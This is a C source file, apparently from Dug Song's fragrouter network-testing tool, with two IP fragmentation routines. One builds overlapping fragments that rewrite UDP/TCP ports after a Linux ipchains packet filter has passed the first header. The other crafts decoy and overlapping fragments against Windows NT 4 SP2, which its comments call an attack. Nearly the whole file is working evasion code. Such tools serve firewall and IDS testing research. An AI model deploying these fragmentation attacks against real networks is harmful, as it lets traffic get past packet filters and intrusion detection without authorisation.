/*
  misc.c

  Dug Song

  Copyright (c) 1999 Anzen Computing. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions
  are met:
  
  1. Redistributions of source code must retain the above copyright
     notice, this list of conditions and the following disclaimer.
  2. Redistributions in binary form must reproduce the above copyright
     notice, this list of conditions and the following disclaimer in the
     documentation and/or other materials provided with the distribution.
  3. All advertising materials mentioning features or use of this software
     must display the following acknowledgement:
     This product includes software developed by Anzen Computing.
  4. Neither the name of Anzen Computing nor the names of its
     contributors may be used to endorse or promote products derived
     from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED
  WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
  MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
  DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE
  GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
  INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER
  IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

  $Id: misc.c,v 1.2 2001/01/08 19:41:56 asdfg Exp $
*/

#include "config.h"

#include <libnet.h>
#include "list.h"
#include "misc.h"

#define IPCHAINS_SPORT	1025
#define IPCHAINS_DPORT	53

ELEM *
misc_linuxipchains(u_char *pkt, int pktlen)
{
  ELEM *new, *list = NULL;

  struct ip *iph = (struct ip *)pkt;
  struct udphdr *udp;
  int ip_hl = iph->ip_hl * 4;
  int ip_len = ntohs(iph->ip_len);
  int hlen = 0;
  u_char *data;

  switch (iph->ip_p) {
  case IPPROTO_UDP:
    hlen = UDP_H;
    break;
  case IPPROTO_TCP:
    hlen = 16;
    break;
  default:
    return NULL;
  }
  if (ip_len - ip_hl < hlen)
    return NULL;
  
  /*
    We want to replace every packet with 3 fragments:
    The first being a full header which meets the packet
    filter, the second being a short fragment that
    rewrites the ports to the desired ports, and then
    the third fragment to finish out the series.
  */
  if (!(data = malloc(ip_hl + hlen))) return NULL;
  memcpy(data, pkt, ip_hl + hlen);
  
  ((struct ip *)data)->ip_len = htons(ip_hl + hlen);
  ((struct ip *)data)->ip_off = htons(IP_MF);

  udp = (struct udphdr *)(data + ip_hl);
  udp->uh_sport = htons(IPCHAINS_SPORT);
  udp->uh_dport = htons(IPCHAINS_DPORT);

  /* Add to our IP fragment list. */
  new = list_elem(data, ip_hl + hlen);
  free(data);
  if (!(list = list_add(list, new)))
    return NULL;

  if (!(data = malloc(ip_hl + 4))) return NULL;
  memcpy(data, pkt, ip_hl + 4);

  ((struct ip *)data)->ip_len = htons(ip_hl + 4);
  ((struct ip *)data)->ip_off = htons(IP_MF);

  /* Add to our IP fragment list. */
  new = list_elem(data, ip_hl + 4);
  free(data);
  if (!(list = list_add(list, new)))
    return NULL;

  if (!(data = malloc(ip_len - hlen))) return NULL;
  memcpy(data, pkt, ip_hl);
  memcpy(data + ip_hl, pkt + ip_hl + hlen, ip_len - ip_hl - hlen);

  ((struct ip *)data)->ip_len = htons(ip_len - hlen);
  ((struct ip *)data)->ip_off = htons(hlen >> 3);

  /* Add to our IP fragment list. */
  new = list_elem(data, ip_len - hlen);
  free(data);
  if (!(list = list_add(list, new)))
    return NULL;

  return (list->head);
}

ELEM *
misc_nt4sp2(u_char *pkt, int pktlen, int fragsize)
{
  ELEM *new, *list = NULL;
  struct ip *iph = (struct ip *)pkt;
  struct udphdr *udph;
  int ip_hl = iph->ip_hl * 4;
  u_short ip_len = ntohs(iph->ip_len);
  u_char *ip_blob = pkt + ip_hl;
  u_char *ip_end = pkt + ip_len;
  u_char *p, *data;
  int ip_mf, hlen, len;

  /*
    Only handle UDP for now. TCP and ICMP don't seem to work,
    probably because memory allocation is handled differently
    (this attack relies on NT's TCP/IP stack using the same
    chunk of memory twice). Need to learn NT kernel debugging...
  */
  if (iph->ip_p != IPPROTO_UDP)
    return NULL;
  
  hlen = UDP_H;
  if (ip_len - ip_hl < (hlen + fragsize * 2)) return NULL;
  len = hlen;

  /* Fragment packet. */
  for (p = ip_blob ; p < ip_end ; ) {
    /* Penultimate frag should be marked as the last frag. */
    if (ip_end - p <= fragsize * 2 && ip_end - p > fragsize)
      ip_mf = 0;
    else
      ip_mf = IP_MF;

    /*
      XXX- pad out last frag to 8-byte multiple. NT doesn't like a short
      fraglen in either the last marked or real last frag in this attack.
      Should fix the UDP checksum too, but this is bogus to begin with.
    */
    if (len < fragsize) {
      if (!(data = malloc(ip_hl + fragsize))) return NULL;
      memset(data, 0, ip_hl + fragsize);
      memcpy(data, pkt, ip_hl);
      memcpy(data + ip_hl, p, len);
      len = fragsize;
    }
    else {
      /* Copy in IP header and data. */
      if (!(data = malloc(ip_hl + len))) return NULL;
      memcpy(data, pkt, ip_hl);
      memcpy(data + ip_hl, p, len);
    }
    /* Correct IP length, IP fragment offset ("skip" first frag). */
    ((struct ip *)data)->ip_len = htons(ip_hl + len);
    ((struct ip *)data)->ip_off =
      htons(ip_mf | ((p + hlen - ip_blob) >> 3));

    /* Add to our IP fragment list. */
    new = list_elem(data, ip_hl + len);
    free(data);
    if (!(list = list_add(list, new)))
      return NULL;

    /* Determine next fragment size. */
    p += len;
    len = ip_end - p;
    if (len > fragsize)
      len = fragsize;
  }
  /* Create preceding decoy frags. */
  list_dup(list->head);
  iph = (struct ip *)(list->head->data);
  iph->ip_id = htons(ntohs(iph->ip_id) + ip_len); /* XXX */
  iph->ip_off = htons(IP_MF);

  /* Decoys will be to the discard port (9). */
  udph = (struct udphdr *)(list->head->data + ip_hl);
  udph->uh_dport = htons(9);

  new = list_dup(list->head);
  iph = (struct ip *)(new->data);
  iph->ip_off = htons((list->head->len - ip_hl) >> 3);
  
  return (list->head);
}
